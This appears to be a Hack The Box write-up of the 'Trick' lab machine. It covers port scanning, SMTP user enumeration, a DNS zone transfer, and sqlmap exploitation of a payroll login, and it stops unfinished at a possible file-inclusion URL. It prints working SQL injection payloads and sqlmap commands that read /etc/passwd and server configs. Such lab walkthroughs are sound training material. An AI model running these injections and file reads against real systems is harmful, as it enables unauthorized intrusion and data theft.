
# HTB-Trick

<img width="862" height="793" alt="Screenshot 2025-09-20 214022" src="https://github.com/AmIACatPurr/HTB-CTF/blob/main/writeups/assets/trick.jpg" />


---
## Intro

Welcome to Trick. This machine isn’t a sci-fi anomaly; it’s a monument to corporate complacency and the illusion of perimeter defense. 
It perfectly illustrates the fundamental law of the digital underground: you don’t always need a flashy zero-day exploit to burn a system down; 
you just need to read the manual better than the person who built it..

Target IP 10.129.26.93
My IP 10.10.14.138

## nmap
We started by mapping the target's digital footprint.

```bash
┌─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #nmap -p- --min-rate 10000 10.129.26.93
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-20 21:48 EDT
Nmap scan report for 10.129.26.93
Host is up (0.0090s latency).
Not shown: 65531 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http

─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #nmap -p 22,25,53,80 -sCV 10.129.26.93
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-20 21:49 EDT
Nmap scan report for 10.129.26.93
Host is up (0.0076s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 241.39 seconds
```
## SMTP
Every script is not working
```bash
┌─[✗]─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #nmap -p 25 --script=smtp-enum-users 10.129.26.93
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-20 21:55 EDT
Nmap scan report for 10.129.26.93
Host is up (0.0077s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users: 
|_  Couldn't establish connection on port 25

─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #nmap -p 25 --script smtp-commands,smtp-ntlm-info 10.129.26.93
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-20 21:56 EDT
Nmap scan report for 10.129.26.93
Host is up (0.0076s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-commands: Couldn't establish connection on port 25


┌─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #telnet 10.129.26.93 25
Trying 10.129.26.93...
Connected to 10.129.26.93.
Escape character is '^]'.
hi
cat
220 debian.localdomain ESMTP Postfix (Debian/GNU)
502 5.5.2 Error: command not recognized
502 5.5.2 Error: command not recognized
VRFY CAT
550 5.1.1 <CAT>: Recipient address rejected: User unknown in local recipient table
VRFY ROOT
252 2.0.0 ROOT
```
USER root PRESENT

## DIG
```bash
┌─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #dig -x 10.129.26.93 @10.129.26.93

; <<>> DiG 9.20.18-1~deb13u1-Debian <<>> -x 10.129.26.93 @10.129.26.93
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 2573
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 32e307ce8c7530d45c4435a76a3748aad13cf7c8fedefd51 (good)
;; QUESTION SECTION:
;93.26.129.10.in-addr.arpa.	IN	PTR

;; ANSWER SECTION:
93.26.129.10.in-addr.arpa. 604800 IN	PTR	trick.htb.

;; AUTHORITY SECTION:
26.129.10.in-addr.arpa.	604800	IN	NS	trick.htb.

;; ADDITIONAL SECTION:
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1

;; Query time: 9 msec
;; SERVER: 10.129.26.93#53(10.129.26.93) (UDP)
;; WHEN: Sat Jun 20 22:12:58 EDT 2026
;; MSG SIZE  rcvd: 163


┌─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #dig axfr @10.129.26.93 trick.htb

; <<>> DiG 9.20.18-1~deb13u1-Debian <<>> axfr @10.129.26.93 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 9 msec
;; SERVER: 10.129.26.93#53(10.129.26.93) (TCP)
;; WHEN: Sat Jun 20 22:13:58 EDT 2026
;; XFR size: 6 records (messages 1, bytes 231)

```

update file hosts with findings
```bash
echo '10.129.26.93 trick.htb preprod-payroll.trick.htb' | sudo tee -a /etc/hosts
```

subdomain enum but got nothing
```bash
┌─[✗]─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.129.26.93 -H "Host: FUZZ.trick.htb" -fs 5480

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.26.93
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : Host: FUZZ.trick.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5480
________________________________________________

:: Progress: [4614/4614] :: Job [1/1] :: 5000 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```
nothing... trying to visit the sites for info http://preprod-payroll.trick.htb/ajax.php?action=login
based on page source, the web app is real - "Employee's Payroll Management System" 
the most fun exploit is related t SQL injection, try
```bash
┌─[✗]─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:32:51 /2026-06-20/

[22:32:51] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=t14nre05vip...5fcgfru14j'). Do you want to use those [Y/n] Y
[22:32:51] [INFO] testing if the target URL content is stable
[22:32:52] [INFO] target URL content is stable
[22:32:52] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[22:32:52] [INFO] testing for SQL injection on POST parameter 'username'
[22:32:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:32:52] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[22:32:52] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:32:52] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[22:32:52] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[22:32:52] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[22:32:52] [INFO] testing 'Generic inline queries'
[22:32:52] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[22:32:52] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[22:32:52] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[22:32:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:33:02] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[22:33:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:33:02] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:33:02] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:33:02] [INFO] target URL appears to have 8 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[22:33:03] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[22:33:03] [INFO] target URL appears to be UNION injectable with 8 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[22:33:04] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 210 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=abc' AND (SELECT 5177 FROM (SELECT(SLEEP(5)))vFiB) AND 'SQPo'='SQPo&password=abc
---
[22:33:19] [INFO] the back-end DBMS is MySQL
[22:33:19] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web application technology: Nginx 1.14.2, PHP
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[22:33:24] [INFO] fetched data logged to text files under '/root/.local/share/s
```

```bash
┌─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --level 5 --risk 3 --technique=BEUS -- batch

.....

sqlmap identified the following injection point(s) with a total of 6745 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=abc' OR NOT 5738=5738-- ZPQj&password=abc

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=abc' OR (SELECT 4199 FROM(SELECT COUNT(*),CONCAT(0x7171766a71,(SELECT (ELT(4199=4199,1))),0x7171707171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uVuj&password=abc
---
[22:43:02] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2, PHP
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[22:43:02] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
[22:43:02] [WARNING] your sqlmap version is outdated
```


```bash
─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --privileges

....
[22:45:06] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2, PHP
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[22:45:06] [INFO] fetching database users privileges
[22:45:06] [INFO] retrieved: ''remo'@'localhost''
[22:45:06] [INFO] retrieved: 'FILE'
database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE

[22:45:06] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'
[22:45:06] [WARNING] your sqlmap version is outdated
```

```bash
┌─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --batch --file-read=/etc/passwd

....
22:46:52] [INFO] fetching file: '/etc/passwd'
[22:46:54] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb'

┌─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
....
michael:x:1001:1001::/home/michael:/bin/bash


┌─[root@htb-mcnqme24xk]─[/home/justdave]
└──╼ #sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=abc&password=abc" -p username --batch --file-read=/etc/nginx/sites￾enabled/default
[22:57:47] [INFO] the local file '/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default' and the remote file '/etc/nginx/sites-enabled/default' have the same size (1058 B)
```
checking the last file i see a new domain hidden inside, i'll add
preprod-marketing.trick.htb
```bash
echo '10.129.26.93 preprod-marketing.trick.htb' | sudo tee -a /etc/hosts
```
checking this new website, an URL is interesting
http://preprod-marketing.trick.htb/index.php?page=services.html

```bash

```
















